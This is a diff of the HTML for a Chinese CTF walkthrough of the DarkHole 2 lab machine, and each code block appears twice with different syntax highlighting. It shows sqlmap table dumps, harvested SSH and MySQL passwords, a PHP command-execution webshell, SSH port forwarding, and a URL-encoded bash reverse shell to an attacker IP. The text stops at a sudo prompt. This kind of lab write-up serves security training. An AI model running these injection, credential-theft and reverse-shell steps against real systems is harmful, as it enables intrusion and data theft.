+<span class="token operator">|</span> <span class="token function">id</span>     <span class="token operator">|</span> int          <span class="token operator">|</span>
+<span class="token operator">|</span> pass   <span class="token operator">|</span> varchar<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">|</span>
 +--------+--------------+
-┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test&#x2F;192.168.81.131]
-└─# sqlmap -u http:&#x2F;&#x2F;192.168.81.131&#x2F;dashboard.php?id&#x3D;* --cookie PHPSESSID&#x3D;t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 -T ssh -C user,id,pass --dump --batch
-[02:30:36] [INFO] fetching entries of column(s) &#39;&#96;user&#96;,id,pass&#39; for table &#39;ssh&#39; in database &#39;darkhole_2&#39;
+┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test/192.168.81.131<span class="token punctuation">]</span>
+└─<span class="token comment"># sqlmap -u http://192.168.81.131/dashboard.php?id=* --cookie PHPSESSID=t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 -T ssh -C user,id,pass --dump --batch</span>
+<span class="token punctuation">[</span>02:30:36<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching entries of column<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token string">'`user`,id,pass'</span> <span class="token keyword">for</span> table <span class="token string">'ssh'</span> <span class="token keyword">in</span> database <span class="token string">'darkhole_2'</span>
 Database: darkhole_2
-Table: ssh
-[2 entries]
+Table: <span class="token function">ssh</span>
+<span class="token punctuation">[</span><span class="token number">2</span> entries<span class="token punctuation">]</span>
 +--------+----+------+
-| user   | id | pass |
+<span class="token operator">|</span> user   <span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> pass <span class="token operator">|</span>
 +--------+----+------+
-| jehad  | 1  | fool |
-+--------+----+------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>查看表<code>users</code>中的字段及内容：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test&#x2F;192.168.81.131]
-└─# sqlmap -u http:&#x2F;&#x2F;192.168.81.131&#x2F;dashboard.php?id&#x3D;* --cookie PHPSESSID&#x3D;t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 -T users --columns --batch
-[02:32:20] [INFO] fetching columns for table &#39;users&#39; in database &#39;darkhole_2&#39;
+<span class="token operator">|</span> jehad  <span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> fool <span class="token operator">|</span>
++--------+----+------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>查看表<code>users</code>中的字段及内容：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test/192.168.81.131<span class="token punctuation">]</span>
+└─<span class="token comment"># sqlmap -u http://192.168.81.131/dashboard.php?id=* --cookie PHPSESSID=t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 -T users --columns --batch</span>
+<span class="token punctuation">[</span>02:32:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching columns <span class="token keyword">for</span> table <span class="token string">'users'</span> <span class="token keyword">in</span> database <span class="token string">'darkhole_2'</span>
 Database: darkhole_2
-Table: users
-[6 columns]
+Table: <span class="token function">users</span>
+<span class="token punctuation">[</span><span class="token number">6</span> columns<span class="token punctuation">]</span>
 +----------------+--------------+
-| Column         | Type         |
+<span class="token operator">|</span> Column         <span class="token operator">|</span> Type         <span class="token operator">|</span>
 +----------------+--------------+
-| address        | varchar(100) |
-| contact_number | int          |
-| email          | varchar(100) |
-| id             | int          |
-| password       | varchar(200) |
-| username       | varchar(100) |
+<span class="token operator">|</span> address        <span class="token operator">|</span> varchar<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">|</span>
+<span class="token operator">|</span> contact_number <span class="token operator">|</span> int          <span class="token operator">|</span>
+<span class="token operator">|</span> email          <span class="token operator">|</span> varchar<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token function">id</span>             <span class="token operator">|</span> int          <span class="token operator">|</span>
+<span class="token operator">|</span> password       <span class="token operator">|</span> varchar<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token operator">|</span>
+<span class="token operator">|</span> username       <span class="token operator">|</span> varchar<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">|</span>
 +----------------+--------------+
-┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test&#x2F;192.168.81.131]
-└─# sqlmap -u http:&#x2F;&#x2F;192.168.81.131&#x2F;dashboard.php?id&#x3D;* --cookie PHPSESSID&#x3D;t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 -T users -C address,contact_number,email,id,password,username --dump --batch
-[02:33:53] [INFO] fetching entries of column(s) &#39;address,contact_number,email,id,password,username&#39; for table &#39;users&#39; in database &#39;darkhole_2&#39;
+┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test/192.168.81.131<span class="token punctuation">]</span>
+└─<span class="token comment"># sqlmap -u http://192.168.81.131/dashboard.php?id=* --cookie PHPSESSID=t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 -T users -C address,contact_number,email,id,password,username --dump --batch</span>
+<span class="token punctuation">[</span>02:33:53<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching entries of column<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token string">'address,contact_number,email,id,password,username'</span> <span class="token keyword">for</span> table <span class="token string">'users'</span> <span class="token keyword">in</span> database <span class="token string">'darkhole_2'</span>
 Database: darkhole_2
-Table: users
-[1 entry]
+Table: <span class="token function">users</span>
+<span class="token punctuation">[</span><span class="token number">1</span> entry<span class="token punctuation">]</span>
 +-------------------------------------------+----------------+----------------+----+----------+-----------------------------+
-| address                                   | contact_number | email          | id | password | username                    |
+<span class="token operator">|</span> address                                   <span class="token operator">|</span> contact_number <span class="token operator">|</span> email          <span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> password <span class="token operator">|</span> username                    <span class="token operator">|</span>
 +-------------------------------------------+----------------+----------------+----+----------+-----------------------------+
-|  Street, Pincode, Province&#x2F;State, Country | 1              | lush@admin.com | 1  | 321      | Jehad Alqurashiasddasdasdas |
-+-------------------------------------------+----------------+----------------+----+----------+-----------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>结合从80登陆查看的用户属性，可以知道80是向users表读取信息，users表中只有一个用户（id=1）。<br>使用ssh表中得到的用户名密码<code>jehad:fool</code>登陆靶机的22：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test&#x2F;192.168.81.131]
-└─# ssh &#39;jehad&#39;@&#39;192.168.81.131&#39;    
+<span class="token operator">|</span>  Street, Pincode, Province/State, Country <span class="token operator">|</span> <span class="token number">1</span>              <span class="token operator">|</span> lush@admin.com <span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> <span class="token number">321</span>      <span class="token operator">|</span> Jehad Alqurashiasddasdasdas <span class="token operator">|</span>
++-------------------------------------------+----------------+----------------+----+----------+-----------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>结合从80登陆查看的用户属性，可以知道80是向users表读取信息，users表中只有一个用户（id=1）。<br>使用ssh表中得到的用户名密码<code>jehad:fool</code>登陆靶机的22：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test/192.168.81.131<span class="token punctuation">]</span>
+└─<span class="token comment"># ssh 'jehad'@'192.168.81.131'    </span>
 
-jehad@darkhole:~$ pwd
-&#x2F;home&#x2F;jehad
-jehad@darkhole:~$ id
-uid&#x3D;1001(jehad) gid&#x3D;1001(jehad) groups&#x3D;1001(jehad)
-jehad@darkhole:~$ ls -a
-.  ..  .bash_history  .bash_logout  .bashrc  .cache  .local  .mysql_history  .profile  .ssh  .viminfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>查看jehad的<code>.bash_history</code>文件，得到mysql连接的用户名与密码<code>root:Qrc123</code>。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">jehad@darkhole:~$ cat .bash_history 
- mysql -u root -p Qrc123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>查看<code>/home</code>目录中有三个用户，分别是<code>jehad</code>、<code>lama</code>和<code>losy</code>，进入到另外两个用户的目录下，收集可用信息，找到一个flag。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">jehad@darkhole:&#x2F;home$ ls -a
-.  ..  jehad  lama  losy
+jehad@darkhole:~$ <span class="token builtin class-name">pwd</span>
+/home/jehad
+jehad@darkhole:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>jehad<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>jehad<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>jehad<span class="token punctuation">)</span>
+jehad@darkhole:~$ <span class="token function">ls</span> -a
+<span class="token builtin class-name">.</span>  <span class="token punctuation">..</span>  .bash_history  .bash_logout  .bashrc  .cache  .local  .mysql_history  .profile  .ssh  .viminfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>查看jehad的<code>.bash_history</code>文件，得到mysql连接的用户名与密码<code>root:Qrc123</code>。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">jehad@darkhole:~$ <span class="token function">cat</span> .bash_history 
+ mysql -u root -p Qrc123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>查看<code>/home</code>目录中有三个用户，分别是<code>jehad</code>、<code>lama</code>和<code>losy</code>，进入到另外两个用户的目录下，收集可用信息，找到一个flag。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">jehad@darkhole:/home$ <span class="token function">ls</span> -a
+<span class="token builtin class-name">.</span>  <span class="token punctuation">..</span>  jehad  lama  losy
 
-jehad@darkhole:&#x2F;home&#x2F;losy$ cat user.txt
-DarkHole&#123;&#39;This_is_the_life_man_better_than_a_cruise&#39;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+jehad@darkhole:/home/losy$ <span class="token function">cat</span> user.txt
+DarkHole<span class="token punctuation">&#123;</span><span class="token string">'This_is_the_life_man_better_than_a_cruise'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 </blockquote>
 <h2 id="4-_u63D0_u6743"><a href="#4-_u63D0_u6743" class="headerlink" title="4.提权"></a>4.提权</h2><blockquote>
-<p>尝试过 <code>sudo</code>、<code>suid</code>、编辑<code>/etc/passwd</code>和利用root登陆数据库darkhole_2往表ssh直接写入数据 都无法提权。故选择查看定式任务<code>cat /etc/crontab</code>。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">jehad@darkhole:~$ cat &#x2F;etc&#x2F;crontab
-# &#x2F;etc&#x2F;crontab: system-wide crontab
-# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;
-# command to install the new version when you edit this file
-# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,
-# that none of the other crontabs do.
+<p>尝试过 <code>sudo</code>、<code>suid</code>、编辑<code>/etc/passwd</code>和利用root登陆数据库darkhole_2往表ssh直接写入数据 都无法提权。故选择查看定时任务<code>cat /etc/crontab</code>。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">jehad@darkhole:~$ <span class="token function">cat</span> /etc/crontab
+<span class="token comment"># /etc/crontab: system-wide crontab</span>
+<span class="token comment"># Unlike any other crontab you don't have to run the `crontab'</span>
+<span class="token comment"># command to install the new version when you edit this file</span>
+<span class="token comment"># and files in /etc/cron.d. These files also have username fields,</span>
+<span class="token comment"># that none of the other crontabs do.</span>
 
-SHELL&#x3D;&#x2F;bin&#x2F;sh
-PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin
+<span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/sh
+<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
-# Example of job definition:
-# .---------------- minute (0 - 59)
-# |  .------------- hour (0 - 23)
-# |  |  .---------- day of month (1 - 31)
-# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
-# |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat
-# |  |  |  |  |
-# *  *  *  *  * user-name command to be executed
-17 *    * * *   root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly
-25 6    * * *   root    test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )
-47 6    * * 7   root    test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )
-52 6    1 * *   root    test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )
-* * * * * root service apache2 start &amp;&amp; service mysql start
-* * * * * losy  cd &#x2F;opt&#x2F;web &amp;&amp; php -S localhost:9999
+<span class="token comment"># Example of job definition:</span>
+<span class="token comment"># .---------------- minute (0 - 59)</span>
+<span class="token comment"># |  .------------- hour (0 - 23)</span>
+<span class="token comment"># |  |  .---------- day of month (1 - 31)</span>
+<span class="token comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
+<span class="token comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
+<span class="token comment"># |  |  |  |  |</span>
+<span class="token comment"># *  *  *  *  * user-name command to be executed</span>
+<span class="token number">17</span> *    * * *   root    <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.hourly
+<span class="token number">25</span> <span class="token number">6</span>    * * *   root    <span class="token builtin class-name">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.daily <span class="token punctuation">)</span>
+<span class="token number">47</span> <span class="token number">6</span>    * * <span class="token number">7</span>   root    <span class="token builtin class-name">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span class="token punctuation">)</span>
+<span class="token number">52</span> <span class="token number">6</span>    <span class="token number">1</span> * *   root    <span class="token builtin class-name">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span class="token punctuation">)</span>
+* * * * * root <span class="token function">service</span> apache2 start <span class="token operator">&amp;&amp;</span> <span class="token function">service</span> mysql start
+* * * * * losy  <span class="token builtin class-name">cd</span> /opt/web <span class="token operator">&amp;&amp;</span> php -S localhost:9999
 
-#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>可以看到losy定时在目录<code>/opt/web</code>下执行任务，监听本地端口<code>9999</code>。<br>进到<code>/opt/web</code>下，看一下php文件：通过<code>GET</code>，传输参数<code>cmd</code>，执行系统命令。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">jehad@darkhole:&#x2F;opt&#x2F;web$ cat index.php 
-&lt;?php
-echo &quot;Parameter GET[&#39;cmd&#39;]&quot;;
-if(isset($_GET[&#39;cmd&#39;]))&#123;
-echo system($_GET[&#39;cmd&#39;]);
-&#125;
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>直接访问<code>http://192.168.81.131:9999/</code>，访问不了。<br>进行端口转发，对本机7777端口的访问映射到靶机的9999端口上(注意:是在攻击机上进行)：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~]
-└─# ssh -N -f -L 7777:127.0.0.1:9999 jehad@192.168.81.131
-jehad@192.168.81.131&#39;s password: 
-┌──(root㉿kali)-[~]
-└─# netstat -tulpn                                       
-Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name    
-tcp        0      0 127.0.0.1:7777          0.0.0.0:*               LISTEN      30998&#x2F;ssh           
-tcp6       0      0 ::1:7777                :::*                    LISTEN      30998&#x2F;ssh           
-udp        0      0 0.0.0.0:68              0.0.0.0:*                           3513&#x2F;dhclient       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>访问攻击机7777端口，并传入参数<code>cmd</code>：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~]
-└─# curl http:&#x2F;&#x2F;localhost:7777         
-Parameter GET[&#39;cmd&#39;]                                                                                                                                                        
-┌──(root㉿kali)-[~]
-└─# curl http:&#x2F;&#x2F;localhost:7777&#x2F;?cmd&#x3D;id
-Parameter GET[&#39;cmd&#39;]uid&#x3D;1002(losy) gid&#x3D;1002(losy) groups&#x3D;1002(losy)
-uid&#x3D;1002(losy) gid&#x3D;1002(losy) groups&#x3D;1002(losy)                                                                                                                                                        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>可以通过losy执行系统命令，想办法反弹shell。<br>本地监听6666端口，将反弹shell代码 <code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.81.130/6666 0&gt;&amp;1&#39;</code> 作为参数传入(注意：此处参数需要进行URL编码)：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~]
-└─# nc -lnvp 6666                                        
-listening on [any] 6666 ...
+<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>可以看到losy定时在目录<code>/opt/web</code>下执行任务，监听本地端口<code>9999</code>。<br>进到<code>/opt/web</code>下，看一下php文件：通过<code>GET</code>，传输参数<code>cmd</code>，执行系统命令。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">jehad@darkhole:/opt/web$ <span class="token function">cat</span> index.php 
+<span class="token operator">&lt;</span>?php
+<span class="token builtin class-name">echo</span> <span class="token string">"Parameter GET['cmd']"</span><span class="token punctuation">;</span>
+if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token punctuation">&#123;</span>
+<span class="token builtin class-name">echo</span> system<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>直接访问<code>http://192.168.81.131:9999/</code>，访问不了。<br>进行端口转发，对本机7777端口的访问映射到靶机的9999端口上(注意:是在攻击机上进行)：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># ssh -N -f -L 7777:127.0.0.1:9999 jehad@192.168.81.131</span>
+jehad@192.168.81.131's password: 
+┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># netstat -tulpn                                       </span>
+Active Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.1:7777          <span class="token number">0.0</span>.0.0:*               LISTEN      <span class="token number">30998</span>/ssh           
+tcp6       <span class="token number">0</span>      <span class="token number">0</span> ::1:7777                :::*                    LISTEN      <span class="token number">30998</span>/ssh           
+udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:68              <span class="token number">0.0</span>.0.0:*                           <span class="token number">3513</span>/dhclient       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>访问攻击机7777端口，并传入参数<code>cmd</code>：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># curl http://localhost:7777         </span>
+Parameter GET<span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span>                                                                                                                                                        
+┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># curl http://localhost:7777/?cmd=id</span>
+Parameter GET<span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span>uid<span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>losy<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>losy<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>losy<span class="token punctuation">)</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>losy<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>losy<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>losy<span class="token punctuation">)</span>                                                                                                                                                        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>可以通过losy执行系统命令，想办法反弹shell。<br>本地监听6666端口，将反弹shell代码 <code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.81.130/6666 0&gt;&amp;1&#39;</code> 作为参数传入(注意：此处参数需要进行URL编码)：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># nc -lnvp 6666                                        </span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">6666</span> <span class="token punctuation">..</span>.
 
-┌──(root㉿kali)-[~]
-└─# curl http:&#x2F;&#x2F;localhost:7777&#x2F;?cmd&#x3D;%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%38%31%2e%31%33%30%2f%36%36%36%36%20%30%3e%26%31%27
+┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># curl http://localhost:7777/?cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%38%31%2e%31%33%30%2f%36%36%36%36%20%30%3e%26%31%27</span>
 
-┌──(root㉿kali)-[~]
-└─# nc -lnvp 6666                                        
-listening on [any] 6666 ...
-connect to [192.168.81.130] from (UNKNOWN) [192.168.81.131] 42016
-bash: cannot set terminal process group (1246): Inappropriate ioctl for device
-bash: no job control in this shell
-losy@darkhole:&#x2F;opt&#x2F;web$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>成功拿到losy的shell，看了一下还是得提到root，发现sudo不了，只拿到了shell外壳，没有校验口令：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">losy@darkhole:&#x2F;home$ sudo -l
-sudo -l
-sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>去看看losy的.bash_history，找到losy的密码gang：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">losy@darkhole:~$ cat .bash_history
-P0assw0rd losy:gang<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>再到jehad那边切换到losy，再<code>sudo -l</code>：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">losy@darkhole:~$ sudo -l
-[sudo] password for losy: 
-Matching Defaults entries for losy on darkhole:
-   env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin
+┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># nc -lnvp 6666                                        </span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">6666</span> <span class="token punctuation">..</span>.
+connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.81.130<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.81.131<span class="token punctuation">]</span> <span class="token number">42016</span>
+bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">1246</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
+bash: no job control <span class="token keyword">in</span> this shell
+losy@darkhole:/opt/web$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>成功拿到losy的shell，看了一下还是得提到root，发现sudo不了，只拿到了shell外壳，没有校验口令：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">losy@darkhole:/home$ <span class="token function">sudo</span> -l
+<span class="token function">sudo</span> -l
+sudo: a terminal is required to <span class="token builtin class-name">read</span> the password<span class="token punctuation">;</span> either use the -S option to <span class="token builtin class-name">read</span> from standard input or configure an askpass helper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>去看看losy的.bash_history，找到losy的密码gang：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">losy@darkhole:~$ <span class="token function">cat</span> .bash_history
+P0assw0rd losy:gang<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>再到jehad那边切换到losy，再<code>sudo -l</code>：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">losy@darkhole:~$ <span class="token function">sudo</span> -l
+<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> losy: 
